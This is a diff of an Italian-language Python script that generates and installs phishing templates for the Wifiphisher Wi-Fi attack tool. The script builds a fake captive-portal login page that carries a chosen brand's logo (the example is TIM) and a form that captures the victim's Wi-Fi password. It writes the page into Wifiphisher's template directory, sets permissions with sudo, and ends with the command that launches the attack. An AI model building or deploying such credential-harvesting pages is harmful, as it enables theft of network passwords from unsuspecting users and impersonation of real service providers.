@@ -1,95 +1,97 @@
 #!/usr/bin/env python3
 import os
 import base64
+import re
 from pathlib import Path
 from PIL import Image
 
 def main():
-    print("=== Generatore di Template Wifiphisher con logo inline ===")
+    print("=== Generatore Template Phishing per Wifiphisher ===")
 
-    # Chiedi nome template
-    name = input("Inserisci il nome della nuova pagina phishing (es. wirem): ").strip()
+    # Input nome scenario
+    name = input("Inserisci il nome della nuova pagina phishing (es. TIM): ").strip()
     if not name:
         print("[!] Nome non valido.")
         return
 
-    # Chiedi path logo
-    logo_path = input("Inserisci il percorso completo dell'immagine PNG da usare come logo: ").strip()
+    # Normalizza il nome: tutto minuscolo, niente spazi o simboli
+    template_name = re.sub(r'\W+', '', name.lower())
+
+    # Input immagine logo
+    logo_path = input("Percorso immagine PNG da usare come logo: ").strip()
     if not os.path.isfile(logo_path):
         print(f"[!] Immagine non trovata: {logo_path}")
         return
 
-    # Percorsi
-    template_name = name
-    base_dir = Path(f"/usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages")
+    # Percorsi directory
+    base_dir = Path("/usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages")
     template_dir = base_dir / template_name
     html_dir = template_dir / "html"
     index_file = html_dir / "index.html"
     config_file = template_dir / "config.ini"
 
-    print(f"[+] Creazione struttura in: {template_dir}")
+    print(f"[+] Creazione cartelle: {template_dir}")
     html_dir.mkdir(parents=True, exist_ok=True)
 
-    # Converti logo in PNG compatibile
-    print("[+] Conversione immagine in PNG...")
+    # Imposta permessi
+    os.system(f"sudo chown -R root:root '{template_dir}'")
+    os.system(f"sudo chmod -R 755 '{template_dir}'")
+
+    # Converte e codifica logo
+    print("[+] Conversione immagine...")
     temp_png = "/tmp/logo_temp.png"
     with Image.open(logo_path) as img:
         img.convert("RGB").save(temp_png, format="PNG", optimize=True)
-
-    # Codifica in base64
-    print("[+] Codifica Base64 del logo...")
     with open(temp_png, "rb") as f:
         logo_b64 = base64.b64encode(f.read()).decode("utf-8")
 
-    # Genera index.html
-    print("[+] Scrittura index.html con logo inline...")
+    # HTML con logo inline + form password
+    print("[+] Scrittura index.html...")
     html = f"""<!doctype html>
 <html lang="it">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Connessione Wi‑Fi — {template_name}</title>
+<title>Accesso Wi‑Fi — {name}</title>
 <style>
-body{{font-family: Arial, Helvetica, sans-serif; background:#f5f7fa; color:#222; margin:0; padding:0;}}
+body{{font-family:sans-serif;background:#f5f7fa;margin:0;padding:0;}}
 .container{{max-width:420px;margin:6vh auto;background:#fff;padding:24px;border-radius:8px;box-shadow:0 6px 20px rgba(0,0,0,0.08);text-align:center;}}
 img.logo{{max-width:220px;height:auto;margin-bottom:12px;}}
-h1{{font-size:20px;margin:6px 0 18px;color:#111;}}
-p.lead{{font-size:14px;color:#444;margin:0 0 18px;}}
-label{{display:block;text-align:left;margin-bottom:6px;font-weight:600;}}
-input[type="password"]{{width:100%;padding:10px;border:1px solid #ccd; border-radius:6px;margin-bottom:12px;font-size:15px;}}
-.btn{{display:inline-block;width:100%;padding:11px;border-radius:6px;border:0;background:#ff6b00;color:#fff;font-weight:700;font-size:15px;cursor:pointer;}}
-.small{{font-size:12px;color:#666;margin-top:12px;}}
-footer{{font-size:11px;color:#999;margin-top:14px;}}
+input{{width:100%;padding:10px;margin:8px 0;font-size:16px;border-radius:6px;border:1px solid #ccc;}}
+button{{width:100%;padding:12px;background:#ff6b00;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;}}
+footer{{font-size:12px;color:#777;margin-top:12px;}}
 </style>
 </head>
 <body>
-<div class="container" role="main" aria-labelledby="title">
-    <img src="data:image/png;base64,{logo_b64}" class="logo" alt="logo">
-    <h1 id="title">Accesso alla rete</h1>
-    <p class="lead">Per continuare la navigazione, inserisci la password della rete.</p>
-    <form method="POST" action="">
-        <label for="pw">Password Wi‑Fi</label>
-        <input id="pw" name="password" type="password" autocomplete="off" required placeholder="Inserisci password">
-        <input class="btn" type="submit" value="Connetti">
+<div class="container">
+    <img src="data:image/png;base64,{logo_b64}" class="logo" alt="Logo">
+    <h2>Connessione a {name}</h2>
+    <p>Per continuare, inserisci la password della rete Wi‑Fi.</p>
+    <form method="POST">
+        <input type="password" name="password" placeholder="Password Wi-Fi" required>
+        <button type="submit">Accedi</button>
     </form>
-    <p class="small">Se non conosci la password, contatta il supporto tecnico.</p>
-    <footer>{template_name} · captive portal</footer>
+    <footer>{name} · captive portal</footer>
 </div>
 </body>
-</html>"""
+</html>
+"""
     index_file.write_text(html, encoding="utf-8")
 
-    # Scrivi config.ini nel formato richiesto
-    print("[+] Scrittura config.ini compatibile...")
+    # config.ini
+    print("[+] Scrittura config.ini...")
     config = f"""[info]
-Name = {template_name} - Accesso WiFi
-Description = Template generato automaticamente con logo personalizzato.
+Name = {name} - Accesso WiFi
+Description = Scenario con logo inline generato automaticamente.
+
 [context]
+redirect_url = https://192.168.1.1
 """
     config_file.write_text(config, encoding="utf-8")
 
-    print(f"[✔] Template '{template_name}' installato correttamente!")
-    print(f"    Avvia con: sudo wifiphisher -p {template_name}")
+    # Output finale
+    print(f"[✔] Template '{template_name}' creato in: {template_dir}")
+    print(f"    Avvialo con: sudo wifiphisher -p {template_name}")
 
 if __name__ == "__main__":
     main()
